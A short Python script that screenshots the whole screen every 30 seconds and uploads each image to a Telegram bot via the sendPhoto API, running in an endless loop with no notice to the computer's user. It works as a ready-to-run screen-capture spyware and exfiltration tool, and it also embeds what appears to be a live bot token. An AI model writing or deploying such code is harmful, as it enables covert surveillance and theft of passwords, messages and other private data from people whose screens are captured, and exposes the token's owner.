import time
import pyautogui
import requests
import certifi
 
# --- CONFIG ---
BOT_TOKEN = "8360663184:AAE-VNwoAMkh__T59pIKX8JDqTu9tEVWHzY"
CHAT_ID = "123456789"
INTERVAL = 30  # seconds between screenshots
 
def send_screenshot():
    # Take screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
 
    # Send to Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {"photo": open("screen.png", "rb")}
    data = {"chat_id": CHAT_ID}
    requests.post(url, files=files, data=data, verify=certifi.where())
 
if __name__ == "__main__":
    while True:
        send_screenshot()
        time.sleep(INTERVAL)